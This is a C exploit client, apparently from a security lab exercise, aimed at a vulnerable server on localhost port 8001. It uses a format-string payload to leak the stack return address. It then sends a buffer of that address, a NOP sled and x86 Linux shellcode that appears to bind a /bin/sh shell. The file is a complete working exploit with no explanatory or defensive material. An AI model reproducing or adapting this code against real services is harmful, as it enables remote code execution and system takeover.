#include <netinet/in.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <stdio.h>
#include <errno.h>
#include <netdb.h>
#include <time.h>

#define PORTNUM 8001
#define BLENGTH 256
#define NOP 0x90

char ret_addr_str[10];
long ret_add_long;

char shellcode[] =
"\x83\xc4\x80"
"\x6a\x66\x6a\x01\x5b\x58\x99\x52\x6a\x01\x6a\x02\x89\xe1\xcd\x80\x89\xc6\x6a\x66\x58\x43\x52\x66"
"\x68\xfc\x15\x66\x53\x89\xe1\x6a\x10\x51\x56\x89\xe1\xcd\x80\x6a\x66\x58\x43\x43\x6a\x05\x56\xcd"
"\x80\x6a\x66\x58\x43\x52\x52\x56\x89\xe1\xcd\x80\x89\xc3\x6a\x3f\x58\x31\xc9\xcd\x80\x6a\x3f\x58"
"\x41\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x99\x50\xb0\x0b\x59\xcd\x80";

static void
test_le_hack(int s, char* arg)
{
  char buffer[BLENGTH];
  /* Receive test prompt */
  recv(s, (void *)buffer, BLENGTH, 0);
  /* Cpy arg to buffer */
  strncpy(buffer, arg, BLENGTH);
  /* Send test response */
  send(s, (void *)buffer, BLENGTH, 0);
  /* Receive the test reply from server */
  recv(s, (void *)buffer, BLENGTH, 0);
  printf("%s\n", buffer);
}

static void
scrape_le_stack(int s)
{
  char buffer[BLENGTH];
  char response_buffer[] = "%p %p %p %p %p %p %p %p %p"; //ret addr is the last one
  char res_str_noise[] = " , is not a valid option\n." \
                         "Please select an option:\n1. Time\n2. Date\n";
  int res_str_trim_len, res_buffer_index;
  
  /* Receive a prompt from the server */
  if (recv(s, (void *)buffer, BLENGTH, 0) != BLENGTH) {
    perror("recv()");
    exit(EXIT_FAILURE);
  }

  /* Send the response to the server */
  send(s, (void *)response_buffer, BLENGTH, 0);

  /* Receive a reply from the server */
  recv(s, (void *)response_buffer, BLENGTH, 0);
  printf("Scrape Response:\n %s\n", response_buffer);
  
  /* Slice the ret_addr_str from the response_buffer */
  res_str_trim_len = strlen(res_str_noise) + 10;
  res_buffer_index = strlen(response_buffer) - res_str_trim_len;
  memcpy(ret_addr_str, &response_buffer[res_buffer_index], 10);
  printf("Return address:%s\n", ret_addr_str);
  
  /* Parse ret_addr_str to ret_add_long */
  ret_add_long = strtol(ret_addr_str, NULL, 0);
  printf("Return address (long): %ld\n", ret_add_long);
}

static void
hack_le_stack(int s)
{
  int i;
  long *addr_ptr;
  char buffer[BLENGTH];
  char *ptr;
  
  addr_ptr = (long *) buffer;
  
  /* Populate buffer with new ret addr */
  for (i = 0; i < BLENGTH; i+=4)
    *(addr_ptr++) = ret_add_long;
  
  /* Add NOPs to buffer */
  memset(buffer, NOP, 32);
  
  /* Add ShellCode to buffer and terminate */
  ptr = buffer;
  ptr += 32;
  for (i = 0; i < strlen(shellcode); i++)
    *(ptr++) = shellcode[i];
  buffer[BLENGTH - 1] = '\0';
  
  /* Send the buffer */
  send(s, (void *)buffer, BLENGTH,0);
  /* Receive a reply from the server */
  recv(s, (void *)buffer, BLENGTH, 0);
  printf("Attack Response:\n %s\n", buffer);
}

/* Connect and talk to the server */
int
main(int argc, char *argv[])
{
  struct sockaddr_in server;
  struct hostent *host;
  int s;
  
  /* Create an Internet family, stream socket */
  s = socket(AF_INET, SOCK_STREAM, 0);
  if (s < 0) {
    perror("socket()");
    exit(EXIT_FAILURE);
  }
  
  /* Server listening on localhost interface */
  if ((host = gethostbyname("localhost")) == NULL) {
    perror("gethostbyname()");
    exit(EXIT_FAILURE);
  }
  
  /* Fill in socket address */
  memset((char *)&server, '\0', sizeof (server));
  server.sin_family = AF_INET;
  server.sin_port = htons(PORTNUM);
  memcpy((char *)&server.sin_addr, host->h_addr_list[0], host->h_length);
  
  /* Connect to server */
  if (connect(s, (struct sockaddr *)&server, sizeof (server)) < 0) {
    perror("connect()");
    exit(EXIT_FAILURE);
  }
  
  if (argc == 2) {
    /* Test passing just one arg to server */
    test_le_hack(s, argv[1]);
  }
  else {
    /* Scrape the return address to be overwriten on le server */
    scrape_le_stack(s);
   
    /* Send attack str to le server */
    hack_le_stack(s);
  }

  /* Close the socket */
  close(s);
  
  return (0);
}
